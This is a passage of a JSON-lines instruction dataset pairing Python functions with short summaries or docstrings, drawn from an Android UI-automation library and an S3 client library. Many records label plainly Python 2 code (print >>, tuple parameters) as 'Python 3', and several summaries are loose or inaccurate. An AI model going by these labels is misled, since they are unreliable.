'00000000'\n                self.windows[int('0x' + wid, 16)] = package\n            return self.windows", "response": "List the windows in the current window."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef findViewById(self, viewId, root=\"ROOT\", viewFilter=None):\n        '''\n        Finds the View with the specified viewId.\n\n        @type viewId: str\n        @param viewId: the ID of the view to find\n        @type root: str\n        @type root: View\n        @param root: the root node of the tree where the View will be searched\n        @type: viewFilter: function\n        @param viewFilter: a function that will be invoked providing the candidate View as a parameter\n                           and depending on the return value (C{True} or C{False}) the View will be\n                           selected and returned as the result of C{findViewById()} or ignored.\n                           This can be C{None} and no extra filtering is applied.\n\n        @return: the C{View} found or C{None}\n        '''\n\n        if not root:\n            return None\n\n        if type(root) == types.StringType and root == \"ROOT\":\n            return self.findViewById(viewId, self.root, viewFilter)\n\n        if root.getId() == viewId:\n            if viewFilter:\n                if viewFilter(root):\n                    return root\n            else:\n                return root\n\n        if re.match('^id/no_id', viewId) or re.match('^id/.+/.+', viewId):\n            if root.getUniqueId() == viewId:\n                if viewFilter:\n                    if viewFilter(root):\n                        return root;\n                else:\n                    return root\n\n\n        for ch in root.children:\n            foundView = self.findViewById(viewId, ch, viewFilter)\n            if foundView:\n                if viewFilter:\n                    if viewFilter(foundView):\n                        return foundView\n                else:\n                    return foundView", "response": "Finds the View with the specified viewId."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nfinding the View with the given ID or raises a ViewNotFoundException if the View is not found.", "response": "def findViewByIdOrRaise(self, viewId, root=\"ROOT\", viewFilter=None):\n        '''\n        Finds the View or raise a ViewNotFoundException.\n\n        @type viewId: str\n        @param viewId: the ID of the view to find\n        @type root: str\n        @type root: View\n        @param root: the root node of the tree where the View will be searched\n        @type: viewFilter: function\n        @param viewFilter: a function that will be invoked providing the candidate View as a parameter\n                           and depending on the return value (C{True} or C{False}) the View will be\n                           selected and returned as the result of C{findViewById()} or ignored.\n                           This can be C{None} and no extra filtering is applied.\n        @return: the View found\n        @raise ViewNotFoundException: raise the exception if View not found\n        '''\n\n        view = self.findViewById(viewId, root, viewFilter)\n        if view:\n            return view\n        else:\n            raise ViewNotFoundException(\"ID\", viewId, root)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nfinding the View with the specified tag or raises a ViewNotFoundException", "response": "def findViewByTagOrRaise(self, tag, root=\"ROOT\"):\n        '''\n        Finds the View with the specified tag or raise a ViewNotFoundException\n        '''\n\n        view = self.findViewWithAttribute('getTag()', tag, root)\n        if view:\n            return view\n        else:\n            raise ViewNotFoundException(\"tag\", tag, root)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef findViewWithAttribute(self, attr, val, root=\"ROOT\"):\n        '''\n        Finds the View with the specified attribute and value\n        '''\n        if DEBUG:\n            try:\n                print >> sys.stderr, u'findViewWithAttribute({0}, {1}, {2})'.format(attr, unicode(val, encoding='utf-8', errors='replace'), root)\n            except:\n                pass\n            print >> sys.stderr, \"    findViewWithAttribute: type(val)=\", type(val)\n\n\n        return self.__findViewWithAttributeInTree(attr, val, root)", "response": "Find the View with the specified attribute and value."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nfind the Views with the specified attribute and value.", "response": "def findViewsWithAttribute(self, attr, val, root=\"ROOT\"):\n        '''\n        Finds the Views with the specified attribute and value.\n        This allows you to see all items that match your criteria in the view hierarchy\n\n        Usage:\n          buttons = v.findViewsWithAttribute(\"class\", \"android.widget.Button\")\n\n        '''\n\n        return self.__findViewsWithAttributeInTree(attr, val, root)"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef findViewWithAttributeOrRaise(self, attr, val, root=\"ROOT\"):\n        '''\n        Finds the View or raise a ViewNotFoundException.\n\n        @return: the View found\n        @raise ViewNotFoundException: raise the exception if View not found\n        '''\n\n        view = self.findViewWithAttribute(attr, val, root)\n        if view:\n            return view\n        else:\n            raise ViewNotFoundException(attr, val, root)", "response": "Finds the View with the specified attribute and returns it."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef findViewWithAttributeThatMatches(self, attr, regex, root=\"ROOT\"):\n        '''\n        Finds the list of Views with the specified attribute matching\n        regex\n        '''\n\n        return self.__findViewWithAttributeInTreeThatMatches(attr, regex, root)", "response": "Returns the View with the specified attribute matching the regex and root."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nfinding the View with the given text or raises a ViewNotFoundException.", "response": "def findViewWithTextOrRaise(self, text, root=\"ROOT\"):\n        '''\n        Finds the View or raise a ViewNotFoundException.\n\n        @return: the View found\n        @raise ViewNotFoundException: raise the exception if View not found\n        '''\n\n        if DEBUG:\n            print >>sys.stderr, \"findViewWithTextOrRaise(%s, %s)\" % (text, root)\n        view = self.findViewWithText(text, root)\n        if view:\n            return view\n        else:\n            raise ViewNotFoundException(\"text\", text, root)"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nfind the list of Views that contain the point x y.", "response": "def findViewsContainingPoint(self, (x, y), _filter=None):\n        '''\n        Finds the list of Views that contain the point (x, y).\n        '''\n\n        if not _filter:\n            _filter = lambda v: True\n\n        return [v for v in self.views if (v.containsPoint((x,y)) and _filter(v))]"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef writeImageToFile(self, filename, _format=\"PNG\", deviceart=None, dropshadow=True, screenglare=True):\n        '''\n        Write the View image to the specified filename in the specified format.\n\n        @type filename: str\n        @param filename: Absolute path and optional filename receiving the image. If this points to\n                         a directory, then the filename is determined by the serialno of the device and\n                         format extension.\n        @type _format: str\n        @param _format: Image format (default format is PNG)\n        '''\n\n        filename = self.device.substituteDeviceTemplate(filename)\n        if not os.path.isabs(filename):\n            raise ValueError(\"writeImageToFile expects an absolute path (filename='%s')\" % filename)\n        if os.path.isdir(filename):\n            filename = os.path.join(filename, self.serialno + '.' + _format.lower())\n        if DEBUG:\n            print >> sys.stderr, \"writeImageToFile: saving image to '%s' in %s format (reconnect=%s)\" % (filename, _format, self.device.reconnect)\n        if self.uiAutomatorHelper:\n            if DEBUG_UI_AUTOMATOR_HELPER:\n                print >> sys.stderr, \"Taking screenshot using UiAutomatorHelper\"\n            received = self.uiAutomatorHelper.takeScreenshot()\n            stream = StringIO.StringIO(received)\n            try:\n                from PIL import Image\n                image = Image.open(stream)\n            except ImportError as ex:\n                self.pilNotInstalledWarning()\n                sys.exit(1)\n            except IOError, ex:\n                print >> sys.stderr, ex\n                print repr(stream)\n                sys.exit(1)\n        else:\n            image = self.device.takeSnapshot(reconnect=self.device.reconnect)\n        if deviceart:\n            if 'STUDIO_DIR' in os.environ:\n                PLUGIN_DIR = 'plugins/android/lib/device-art-resources'\n                osName = platform.system()\n                if osName == 'Darwin':\n                    deviceArtDir = os.environ['STUDIO_DIR'] + '/Contents/' + PLUGIN_DIR\n                else:\n                    deviceArtDir = os.environ['STUDIO_DIR'] + '/' + PLUGIN_DIR\n                # FIXME: should parse XML\n                deviceArtXml = deviceArtDir + '/device-art.xml'\n                if not os.path.exists(deviceArtXml):\n                    warnings.warn(\"Cannot find device art definition file\")\n                # <device id=\"nexus_5\" name=\"Nexus 5\">\n                #       <orientation name=\"port\" size=\"1370,2405\" screenPos=\"144,195\" screenSize=\"1080,1920\" shadow=\"port_shadow.png\" back=\"port_back.png\" lights=\"port_fore.png\"/>\n                #       <orientation name=\"land\" size=\"2497,1235\" screenPos=\"261,65\" screenSize=\"1920,1080\" shadow=\"land_shadow.png\" back=\"land_back.png\" lights=\"land_fore.png\"/>\n                # </device>\n                orientation = self.display['orientation']\n                if orientation == 0 or orientation == 2:\n                    orientationName = 'port'\n                elif orientation == 1 or orientation == 3:\n                    orientationName = 'land'\n                else:\n                    warnings.warn(\"Unknown orientation=\" + orientation)\n                    orientationName = 'port'\n                separator = '_'\n                if deviceart == 'auto':\n                    hardware = self.device.getProperty('ro.hardware')\n                    if hardware == 'hammerhead':\n                        deviceart = 'nexus_5'\n                    elif hardware == 'mako':\n                        deviceart = 'nexus_4'\n                    elif hardware == 'grouper':\n                        deviceart = 'nexus_7' # 2012\n                    elif hardware == 'flo':\n                        deviceart = 'nexus_7_2013'\n                    elif hardware in ['mt5861', 'mt5890', 'maserati', 'maxim']:\n                        deviceart = 'tv_1080p'\n                    elif hardware == 'universal5410':\n                        deviceart = 'samsung_s4'\n\n                SUPPORTED_DEVICES = ['nexus_5', 'nexus_4', 'nexus_7', 'nexus_7_2013', 'tv_1080p', 'samsung_s4']\n                if deviceart not in SUPPORTED_DEVICES:\n                    warnings.warn(\"Only %s is supported now, more devices coming soon\" % SUPPORTED_DEVICES)\n                if deviceart == 'auto':\n                    # it wasn't detected yet, let's assume generic phone\n                    deviceart = 'phone'\n\n                screenSize = None\n                if deviceart == 'nexus_5':\n                    if orientationName == 'port':\n                        screenPos = (144, 195)\n                    else:\n                        screenPos = (261, 65)\n                elif deviceart == 'nexus_4':\n                    if orientationName == 'port':\n                        screenPos = (94, 187)\n                    else:\n                        screenPos = (257, 45)\n                elif deviceart == 'nexus_7': # 2012\n                    if orientationName == 'port':\n                        screenPos = (142, 190)\n                    else:\n                        screenPos = (260, 105)\n                elif deviceart == 'nexus_7_2013':\n                    if orientationName == 'port':\n                        screenPos = (130, 201)\n                        screenSize = (800, 1280)\n                    else:\n                        screenPos = (282, 80)\n                        screenSize = (1280, 800)\n                elif deviceart == 'tv_1080p':\n                    screenPos = (85, 59)\n                    orientationName = ''\n                    separator = ''\n                elif deviceart == 'samsung_s4':\n                    if orientationName == 'port':\n                        screenPos = (76, 220)\n                        screenSize = (1078, 1902) # FIXME: (1080, 1920) is the original size\n                    else:\n                        screenPos = (0, 0)\n                elif deviceart == 'phone':\n                    if orientationName == 'port':\n                        screenPos = (113, 93)\n                        screenSize = (343, 46) # 46?, this is in device-art.xml\n                    else:\n                        screenPos = (141, 36)\n                        screenSize = (324, 255)\n\n                deviceArtModelDir = deviceArtDir + '/' + deviceart\n                if not os.path.isdir(deviceArtModelDir):\n                    warnings.warn(\"Cannot find device art for \" + deviceart + ' at ' + deviceArtModelDir)\n                try:\n                    from PIL import Image\n                    if dropshadow:\n                        dropShadowImage = Image.open(deviceArtModelDir + '/%s%sshadow.png' % (orientationName, separator))\n                    deviceBack = Image.open(deviceArtModelDir + '/%s%sback.png' % (orientationName, separator))\n                    if dropshadow:\n                        dropShadowImage.paste(deviceBack, (0, 0), deviceBack)\n                        deviceBack = dropShadowImage\n                    if screenSize:\n                        image = image.resize(screenSize, Image.ANTIALIAS)\n                    deviceBack.paste(image, screenPos)\n                    if screenglare:\n                        screenGlareImage = Image.open(deviceArtModelDir + '/%s%sfore.png' % (orientationName, separator))\n                        deviceBack.paste(screenGlareImage, (0, 0), screenGlareImage)\n                    image = deviceBack\n                except IOError as ex:\n                    warnings.warn(\"ViewClient.writeImageToFile: Some new devices have webp art which is still not supported by ViewClient\")\n                except ImportError as ex:\n                    self.pilNotInstalledWarning()\n            else:\n                warnings.warn(\"ViewClient.writeImageToFile: Cannot add device art because STUDIO_DIR environment variable was not set\")\n        image.save(filename, _format)", "response": "Write the View image to the specified file."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nmakes the tree pickleable.", "response": "def __pickleable(tree):\n        '''\n        Makes the tree pickleable.\n        '''\n\n        def removeDeviceReference(view):\n            '''\n            Removes the reference to a L{MonkeyDevice}.\n            '''\n\n            view.device = None\n\n        ###########################################################################################\n        # FIXME: Unfortunately deepcopy does not work with MonkeyDevice objects, which is\n        # sadly the reason why we cannot pickle the tree and we need to remove the MonkeyDevice\n        # references.\n        # We wanted to copy the tree to preserve the original and make piclkleable the copy.\n        #treeCopy = copy.deepcopy(tree)\n        treeCopy = tree\n        # IMPORTANT:\n        # This assumes that the first element in the list is the tree root\n        ViewClient.__traverse(treeCopy[0], transform=removeDeviceReference)\n        ###########################################################################################\n        return treeCopy"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef distanceTo(self, tree):\n        '''\n        Calculates the distance between the current state and the tree passed as argument.\n\n        @type tree: list of Views\n        @param tree: Tree of Views\n        @return: the distance\n        '''\n        return ViewClient.distance(ViewClient.__pickleable(self.views), tree)", "response": "Calculates the distance between the current state and the tree passed as argument."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef distance(tree1, tree2):\n        '''\n        Calculates the distance between the two trees.\n\n        @type tree1: list of Views\n        @param tree1: Tree of Views\n        @type tree2: list of Views\n        @param tree2: Tree of Views\n        @return: the distance\n        '''\n        ################################################################\n        #FIXME: this should copy the entire tree and then transform it #\n        ################################################################\n        pickleableTree1 = ViewClient.__pickleable(tree1)\n        pickleableTree2 = ViewClient.__pickleable(tree2)\n        s1 = pickle.dumps(pickleableTree1)\n        s2 = pickle.dumps(pickleableTree2)\n\n        if DEBUG_DISTANCE:\n            print >>sys.stderr, \"distance: calculating distance between\", s1[:20], \"and\", s2[:20]\n\n        l1 = len(s1)\n        l2 = len(s2)\n        t = float(max(l1, l2))\n\n        if l1 == l2:\n            if DEBUG_DISTANCE:\n                print >>sys.stderr, \"distance: trees have same length, using Hamming distance\"\n            return ViewClient.__hammingDistance(s1, s2)/t\n        else:\n            if DEBUG_DISTANCE:\n                print >>sys.stderr, \"distance: trees have different length, using Levenshtein distance\"\n            return ViewClient.__levenshteinDistance(s1, s2)/t", "response": "Calculates the distance between two trees."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nfind the Hamming distance between two strings.", "response": "def __hammingDistance(s1, s2):\n        '''\n        Finds the Hamming distance between two strings.\n\n        @param s1: string\n        @param s2: string\n        @return: the distance\n        @raise ValueError: if the lenght of the strings differ\n        '''\n\n        l1 = len(s1)\n        l2 = len(s2)\n\n        if l1 != l2:\n            raise ValueError(\"Hamming distance requires strings of same size.\")\n\n        return sum(ch1 != ch2 for ch1, ch2 in zip(s1, s2))"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nfinding the Hamming distance between this tree and the one passed as argument.", "response": "def hammingDistance(self, tree):\n        '''\n        Finds the Hamming distance between this tree and the one passed as argument.\n        '''\n\n        s1 = ' '.join(map(View.__str__, self.views))\n        s2 = ' '.join(map(View.__str__, tree))\n\n        return ViewClient.__hammingDistance(s1, s2)"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nfind the Levenshtein distance between two Strings. Python version of Levenshtein distance method implemented in Java at U{http://www.java2s.com/Code/Java/Data-Type/FindtheLevenshteindistancebetweentwoStrings.htm}. This is the number of changes needed to change one String into another, where each change is a single character modification (deletion, insertion or substitution). The previous implementation of the Levenshtein distance algorithm was from U{http://www.merriampark.com/ld.htm} Chas Emerick has written an implementation in Java, which avoids an OutOfMemoryError which can occur when my Java implementation is used with very large strings. This implementation of the Levenshtein distance algorithm is from U{http://www.merriampark.com/ldjava.htm}:: StringUtils.getLevenshteinDistance(null, *) = IllegalArgumentException StringUtils.getLevenshteinDistance(*, null) = IllegalArgumentException StringUtils.getLevenshteinDistance(\"\",\"\") = 0 StringUtils.getLevenshteinDistance(\"\",\"a\") = 1 StringUtils.getLevenshteinDistance(\"aaapppp\", \"\") = 7 StringUtils.getLevenshteinDistance(\"frog\", \"fog\") = 1 StringUtils.getLevenshteinDistance(\"fly\", \"ant\") = 3 StringUtils.getLevenshteinDistance(\"elephant\", \"hippo\") = 7 StringUtils.getLevenshteinDistance(\"hippo\", \"elephant\") = 7 StringUtils.getLevenshteinDistance(\"hippo\", \"zzzzzzzz\") = 8 StringUtils.getLevenshteinDistance(\"hello\", \"hallo\") = 1 @param s: the first String, must not be null @param t: the second String, must not be null @return: result distance @raise ValueError: if either String input C{null}", "response": "def __levenshteinDistance(s, t):\n        '''\n        Find the Levenshtein distance between two Strings.\n\n        Python version of Levenshtein distance method implemented in Java at\n        U{http://www.java2s.com/Code/Java/Data-Type/FindtheLevenshteindistancebetweentwoStrings.htm}.\n\n        This is the number of changes needed to change one String into\n        another, where each change is a single character modification (deletion,\n        insertion or substitution).\n\n        The previous implementation of the Levenshtein distance algorithm\n        was from U{http://www.merriampark.com/ld.htm}\n\n        Chas Emerick has written an implementation in Java, which avoids an OutOfMemoryError\n        which can occur when my Java implementation is used with very large strings.\n        This implementation of the Levenshtein distance algorithm\n        is from U{http://www.merriampark.com/ldjava.htm}::\n\n            StringUtils.getLevenshteinDistance(null, *)             = IllegalArgumentException\n            StringUtils.getLevenshteinDistance(*, null)             = IllegalArgumentException\n            StringUtils.getLevenshteinDistance(\"\",\"\")               = 0\n            StringUtils.getLevenshteinDistance(\"\",\"a\")              = 1\n            StringUtils.getLevenshteinDistance(\"aaapppp\", \"\")       = 7\n            StringUtils.getLevenshteinDistance(\"frog\", \"fog\")       = 1\n            StringUtils.getLevenshteinDistance(\"fly\", \"ant\")        = 3\n            StringUtils.getLevenshteinDistance(\"elephant\", \"hippo\") = 7\n            StringUtils.getLevenshteinDistance(\"hippo\", \"elephant\") = 7\n            StringUtils.getLevenshteinDistance(\"hippo\", \"zzzzzzzz\") = 8\n            StringUtils.getLevenshteinDistance(\"hello\", \"hallo\")    = 1\n\n        @param s:  the first String, must not be null\n        @param t:  the second String, must not be null\n        @return: result distance\n        @raise ValueError: if either String input C{null}\n        '''\n        if s is None or t is None:\n            raise ValueError(\"Strings must not be null\")\n\n        n = len(s)\n        m = len(t)\n\n        if n == 0:\n            return m\n        elif m == 0:\n            return n\n\n        if n > m:\n            tmp = s\n            s = t\n            t = tmp\n            n = m;\n            m = len(t)\n\n        p = [None]*(n+1)\n        d = [None]*(n+1)\n\n        for i in range(0, n+1):\n            p[i] = i\n\n        for j in range(1, m+1):\n            if DEBUG_DISTANCE:\n                if j % 100 == 0:\n                    print >>sys.stderr, \"DEBUG:\", int(j/(m+1.0)*100),\"%\\r\",\n            t_j = t[j-1]\n            d[0] = j\n\n            for i in range(1, n+1):\n                cost = 0 if s[i-1] == t_j else 1\n                #  minimum of cell to the left+1, to the top+1, diagonally left and up +cost\n                d[i] = min(min(d[i-1]+1, p[i]+1), p[i-1]+cost)\n\n            _d = p\n            p = d\n            d = _d\n\n        if DEBUG_DISTANCE:\n            print >> sys.stderr, \"\\n\"\n        return p[n]"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nfind the Levenshtein distance between this tree and the one passed as argument.", "response": "def levenshteinDistance(self, tree):\n        '''\n        Finds the Levenshtein distance between this tree and the one passed as argument.\n        '''\n\n        s1 = ' '.join(map(View.__microStr__, self.views))\n        s2 = ' '.join(map(View.__microStr__, tree))\n\n        return ViewClient.__levenshteinDistance(s1, s2)"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef add_task(self, func, *args, **kargs):\n        self.tasks_queue.put((func, args, kargs))", "response": "Add a task to the queue"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef start_parallel(self):\n        for _ in range(self.num_threads):\n            Worker(self.tasks_queue, self.results_queue, self.exceptions_queue)", "response": "Start the threads in parallel."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef result(self):\n        # Send None to all threads to cleanly stop them\n        for _ in range(self.num_threads):\n            self.tasks_queue.put(None)\n        # Wait for completion of all the tasks in the queue\n        self.tasks_queue.join()\n        # Check if one of the thread raised an exception, if yes\n        # raise it here in the function\n        if not self.exceptions_queue.empty():\n            raise self.exceptions_queue.get()\n        return self.results_queue", "response": "Stop threads and return the result of all called tasks"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nmarshaling s bucket constraint based on *region*.", "response": "def xml_marshal_bucket_constraint(region):\n    \"\"\"\n    Marshal's bucket constraint based on *region*.\n\n    :param region: Region name of a given bucket.\n    :return: Marshalled XML data.\n    \"\"\"\n    root = s3_xml.Element('CreateBucketConfiguration', {'xmlns': _S3_NAMESPACE})\n    location_constraint = s3_xml.SubElement(root, 'LocationConstraint')\n    location_constraint.text = region\n    data = io.BytesIO()\n    s3_xml.ElementTree(root).write(data, encoding=None, xml_declaration=False)\n    return data.getvalue()"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nmarshaling s complete multipart upload request based on uploaded_parts.", "response": "def xml_marshal_complete_multipart_upload(uploaded_parts):\n    \"\"\"\n    Marshal's complete multipart upload request based on *uploaded_parts*.\n\n    :param uploaded_parts: List of all uploaded parts, ordered by part number.\n    :return: Marshalled XML data.\n    \"\"\"\n    root = s3_xml.Element('CompleteMultipartUpload', {'xmlns': _S3_NAMESPACE})\n    for uploaded_part in uploaded_parts:\n        part_number = uploaded_part.part_number\n        part = s3_xml.SubElement(root, 'Part')\n        part_num = s3_xml.SubElement(part, 'PartNumber')\n        part_num.text = str(part_number)\n        etag = s3_xml.SubElement(part, 'ETag')\n        etag.text = '\"' + uploaded_part.etag + '\"'\n        data = io.BytesIO()\n        s3_xml.ElementTree(root).write(data, encoding=None,\n                                       xml_declaration=False)\n    return data.getvalue()"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef xml_marshal_bucket_notifications(notifications):\n    root = s3_xml.Element('NotificationConfiguration', {'xmlns': _S3_NAMESPACE})\n    _add_notification_config_to_xml(\n        root,\n        'TopicConfiguration',\n        notifications.get('TopicConfigurations', [])\n    )\n    _add_notification_config_to_xml(\n        root,\n        'QueueConfiguration',\n        notifications.get('QueueConfigurations', [])\n    )\n    _add_notification_config_to_xml(\n        root,\n        'CloudFunctionConfiguration',\n        notifications.get('CloudFunctionConfigurations', [])\n    )\n\n    data = io.BytesIO()\n    s3_xml.ElementTree(root).write(data, encoding=None, xml_declaration=False)\n    return data.getvalue()", "response": "Marshal the notifications into a single object that can be sent to S3 compatible storage."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _add_notification_config_to_xml(node, element_name, configs):\n    for config in configs:\n        config_node = s3_xml.SubElement(node, element_name)\n\n        if 'Id' in config:\n            id_node = s3_xml.SubElement(config_node, 'Id')\n            id_node.text = config['Id']\n\n        arn_node = s3_xml.SubElement(\n            config_node,\n            NOTIFICATIONS_ARN_FIELDNAME_MAP[element_name]\n        )\n        arn_node.text = config['Arn']\n\n        for event in config['Events']:\n            event_node = s3_xml.SubElement(config_node, 'Event')\n            event_node.text = event\n\n        filter_rules = config.get('Filter', {}).get(\n            'Key', {}).get('FilterRules', [])\n        if filter_rules:\n            filter_node = s3_xml.SubElement(config_node, 'Filter')\n            s3key_node = s3_xml.SubElement(filter_node, 'S3Key')\n            for filter_rule in filter_rules:\n                filter_rule_node = s3_xml.SubElement(s3key_node, 'FilterRule')\n                name_node = s3_xml.SubElement(filter_rule_node, 'Name')\n                name_node.text = filter_rule['Name']\n                value_node = s3_xml.SubElement(filter_rule_node, 'Value')\n                value_node.text = filter_rule['Value']\n    return node", "response": "Internal function that builds the XML sub - structure for a given element of a given notification configuration."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nmarshaling Multi - Object Delete request body from object names.", "response": "def xml_marshal_delete_objects(object_names):\n    \"\"\"\n    Marshal Multi-Object Delete request body from object names.\n\n    :param object_names: List of object keys to be deleted.\n    :return: Serialized XML string for multi-object delete request body.\n    \"\"\"\n    root = s3_xml.Element('Delete')\n\n    # use quiet mode in the request - this causes the S3 Server to\n    # limit its response to only object keys that had errors during\n    # the delete operation.\n    quiet = s3_xml.SubElement(root, 'Quiet')\n    quiet.text = \"true\"\n\n    # add each object to the request.\n    for object_name in object_names:\n        object_elt = s3_xml.SubElement(root, 'Object')\n        key_elt = s3_xml.SubElement(object_elt, 'Key')\n        key_elt.text = object_name\n\n    # return the marshalled xml.\n    data = io.BytesIO()\n    s3_xml.ElementTree(root).write(data, encoding=None, xml_declaration=False)\n    return data.getvalue()"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nset key policy condition.", "response": "def set_key(self, key):\n        \"\"\"\n        Set key policy condition.\n\n        :param key: set key name.\n        \"\"\"\n        is_non_empty_string(key)\n\n        self.policies.append(('eq', '$key', key))\n        self.form_data['key'] = key\n        self.key = key"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nsetting key starts with policy condition.", "response": "def set_key_startswith(self, key_startswith):\n        \"\"\"\n        Set key startswith policy condition.\n\n        :param key_startswith: set key prefix name.\n        \"\"\"\n        is_non_empty_string(key_startswith)\n\n        self.policies.append(('starts-with', '$key', key_startswith))\n        self.form_data['key'] = key_startswith"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef set_bucket_name(self, bucket_name):\n        is_valid_bucket_name(bucket_name)\n\n        self.policies.append(('eq', '$bucket', bucket_name))\n        self.form_data['bucket'] = bucket_name\n        self.bucket_name = bucket_name", "response": "Set bucket name policy condition."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef set_content_type(self, content_type):\n        self.policies.append(('eq', '$Content-Type', content_type))\n        self.form_data['Content-Type'] = content_type", "response": "Set content - type policy condition."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nsets the content length range policy condition.", "response": "def set_content_length_range(self, min_length, max_length):\n        \"\"\"\n        Set content length range policy condition.\n           Raise :exc:`ValueError` for invalid inputs.\n\n        :param min_length: Minimum length limit for content size.\n        :param max_length: Maximum length limit for content size.\n        \"\"\"\n        err_msg = ('Min-length ({}) must be <= Max-length ({}), '\n                   'and they must be non-negative.').format(\n                       min_length, max_length\n                   )\n        if min_length > max_length or min_length < 0 or max_length < 0:\n            raise ValueError(err_msg)\n\n        self._content_length_range = (min_length, max_length)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nmarshaling various policies into json str / bytes.", "response": "def _marshal_json(self, extras=()):\n        \"\"\"\n        Marshal various policies into json str/bytes.\n        \"\"\"\n        policies = self.policies[:]\n        policies.extend(extras)\n        if self._content_length_range:\n            policies.append(['content-length-range'] +\n                            list(self._content_length_range))\n\n        policy_stmt = {\n            \"expiration\": self._expiration.strftime(\n                \"%Y-%m-%dT%H:%M:%S.000Z\"),\n        }\n\n        if len(policies) > 0:\n            policy_stmt[\"conditions\"] = policies\n\n        return json.dumps(policy_stmt)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nencode json into base64.", "response": "def base64(self, extras=()):\n        \"\"\"\n        Encode json into base64.\n        \"\"\"\n        s = self._marshal_json(extras=extras)\n        s_bytes = s if isinstance(s, bytes) else s.encode('utf-8')\n        b64enc = base64.b64encode(s_bytes)\n        return b64enc.decode('utf-8') if isinstance(b64enc, bytes) else b64enc"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nvalidate for required parameters.", "response": "def is_valid(self):\n        \"\"\"\n        Validate for required parameters.\n        \"\"\"\n        if not isinstance(self._expiration, datetime.datetime):\n            raise InvalidArgumentError('Expiration datetime must be specified.')\n\n        if 'key' not in self.form_data:\n            raise InvalidArgumentError('object key must be specified.')\n\n        if 'bucket' not in self.form_data:\n            raise InvalidArgumentError('bucket name must be specified.')"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef post_presign_signature(date, region, secret_key, policy_str):\n    signing_key = generate_signing_key(date, region, secret_key)\n    signature = hmac.new(signing_key, policy_str.encode('utf-8'),\n                         hashlib.sha256).hexdigest()\n\n    return signature", "response": "Calculates the signature version 4 for POST policy string."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef presign_v4(method, url, access_key, secret_key, session_token=None,\n               region=None, headers=None, expires=None, response_headers=None,\n               request_date=None):\n    \"\"\"\n    Calculates signature version '4' for regular presigned URLs.\n\n    :param method: Method to be presigned examples 'PUT', 'GET'.\n    :param url: URL to be presigned.\n    :param access_key: Access key id for your AWS s3 account.\n    :param secret_key: Secret access key for your AWS s3 account.\n    :param session_token: Session token key set only for temporary\n       access credentials.\n    :param region: region of the bucket, it is optional.\n    :param headers: any additional HTTP request headers to\n       be presigned, it is optional.\n    :param expires: final expiration of the generated URL. Maximum is 7days.\n    :param response_headers: Specify additional query string parameters.\n    :param request_date: the date of the request.\n    \"\"\"\n\n    # Validate input arguments.\n    if not access_key or not secret_key:\n        raise InvalidArgumentError('Invalid access_key and secret_key.')\n\n    if region is None:\n        region = 'us-east-1'\n\n    if headers is None:\n        headers = {}\n\n    if expires is None:\n        expires = '604800'\n\n    if request_date is None:\n        request_date = datetime.utcnow()\n\n    parsed_url = urlsplit(url)\n    content_hash_hex = _UNSIGNED_PAYLOAD\n    host = parsed_url.netloc\n    headers['Host'] = host\n    iso8601Date = request_date.strftime(\"%Y%m%dT%H%M%SZ\")\n\n    headers_to_sign = headers\n    # Construct queries.\n    query = {}\n    query['X-Amz-Algorithm'] = _SIGN_V4_ALGORITHM\n    query['X-Amz-Credential'] = generate_credential_string(access_key,\n                                                           request_date,\n                                                           region)\n    query['X-Amz-Date'] = iso8601Date\n    query['X-Amz-Expires'] = str(expires)\n    if session_token:\n        query['X-Amz-Security-Token'] = session_token\n\n    signed_headers = get_signed_headers(headers_to_sign)\n    query['X-Amz-SignedHeaders'] = ';'.join(signed_headers)\n\n    if response_headers is not None:\n        query.update(response_headers)\n\n    # URL components.\n    url_components = [parsed_url.geturl()]\n    if query is not None:\n        ordered_query = collections.OrderedDict(sorted(query.items()))\n        query_components = []\n        for component_key in ordered_query:\n            single_component = [component_key]\n            if ordered_query[component_key] is not None:\n                single_component.append('=')\n                single_component.append(\n                    queryencode(ordered_query[component_key])\n                )\n            else:\n                single_component.append('=')\n            query_components.append(''.join(single_component))\n\n        query_string = 